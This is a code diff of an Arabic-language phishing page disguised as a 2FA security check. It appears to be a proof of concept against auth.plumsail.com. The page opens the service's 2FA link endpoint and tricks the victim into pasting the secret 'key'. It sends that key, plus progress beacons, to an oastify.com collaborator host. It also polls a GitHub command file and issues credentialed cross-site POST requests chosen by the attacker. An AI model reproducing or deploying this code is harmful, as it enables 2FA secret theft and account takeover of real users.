@@ -1,40 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Updating System...</title>
+    <title>تحديث أمان الحساب</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f7f6; color: #333; }
+        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background-color: #3498db; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        button:hover { background-color: #2980b9; }
+        #manual-input { margin-top: 20px; display: none; }
+        input { padding: 10px; width: 80%; border: 1px solid #ccc; border-radius: 4px; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <h2 id="msg">برجاء الانتظار، جاري تحديث الجلسة...</h2>
+    <div class="container">
+        <h2>جاري فحص حالة الحساب...</h2>
+        <div class="loader"></div>
+        <p id="status">يرجى الضغط على الزر أدناه لتأكيد هويتك وتحديث إعدادات الأمان (2FA).</p>
+        
+        <button onclick="startAttack()">تأكيد الهوية الآن</button>
+
+        <div id="manual-input">
+            <p>انسخ الكود (Key) الذي ظهر في النافذة المنبثقة وضعه هنا:</p>
+            <input type="text" id="victimCode" placeholder="ضع الكود هنا...">
+            <button onclick="sendToBurp()">إرسال</button>
+        </div>
+    </div>
 
     <script>
-        // الروابط الخاصة بك
+        // ضع روابطك هنا
         const githubCmd = "https://raw.githubusercontent.com/mohamed-talaat0/AttackerWeb/refs/heads/main/cmd.json";
-        const burpExfil = "https://88erdfpo5whuhkv0fqqoo6e9m0srgm4b.oastify.com";
+        const burpExfil = "https://mnd5st42kaw8wyaeu4523ktn1e75v1jq.oastify.com";
 
         async function startAttack() {
-    // المرحلة 1: فتح صفحة الكود للضحية في نافذة جديدة (Popup)
-    // المتصفح سيطلب من الضحية السماح بالـ Popup، لذا اجعلها نتيجة "ضغطة زر"
-            alert("اضغط موافق لتحديث إعدادات الأمان الخاصة بك");
-            let victimWin = window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "_blank", "width=500,height=500");
+            // 1. إبلاغ Burp أن الضحية بدأ التفاعل
+            new Image().src = burpExfil + "/victim_started";
 
-    // المرحلة 2: بما أننا لا نستطيع قراءة محتوى victimWin، سنطلب من الضحية "نسخه"
-    // أو سنقوم بمراقبة الـ Clipboard إذا كان المتصفح قديماً، 
-    // لكن الأفضل هو الانتظار حتى تضع أنت الرابط في جيت هب يدوياً بعد رؤيته
-    
-            console.log("Waiting for manual command from GitHub...");
+            // 2. فتح صفحة الـ JSON في نافذة جديدة
+            // بما أن CORS يمنع القراءة برمجياً، سنجعل الضحية يراها
+            window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "SecurityCheck", "width=500,height=500");
+
+            // 3. إظهار حقل الإدخال للتمويه (Social Engineering)
+            document.getElementById("status").innerText = "برجاء نسخ قيمة 'key' من النافذة التي فتحت ووضعها أدناه.";
+            document.getElementById("manual-input").style.display = "block";
+
+            // 4. بدء مراقبة أوامرك من GitHub لتنفيذ الريكوست الثاني (POST)
             monitorGitHub();
-            
         }
-        
 
-        window.onload = startAttack;
+        function sendToBurp() {
+            let code = document.getElementById("victimCode").value;
+            if(code) {
+                // إرسال الكود الذي وضعه الضحية إلى Burp فوراً
+                fetch(burpExfil + "/?captured_key=" + btoa(code), {mode: 'no-cors'});
+                alert("تم استلام الكود، جاري المعالجة...");
+            }
+        }
+
+        async function monitorGitHub() {
+            setInterval(async () => {
+                try {
+                    let response = await fetch(githubCmd + "?t=" + Date.now());
+                    let cmd = await response.json();
+
+                    if (cmd.url && cmd.url !== "") {
+                        // تنفيذ الريكوست الثاني (POST)
+                        // استخدام XMLHttpRequest لضمان إرسال الكوكيز (withCredentials)
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("POST", cmd.url, true);
+                        xhr.withCredentials = true; 
+                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                        xhr.send(cmd.body || null);
+
+                        new Image().src = burpExfil + "/post_action_executed";
+                        console.log("Action Executed!");
+                    }
+                } catch (e) { }
+            }, 3000);
+        }
     </script>
 </body>
 </html>
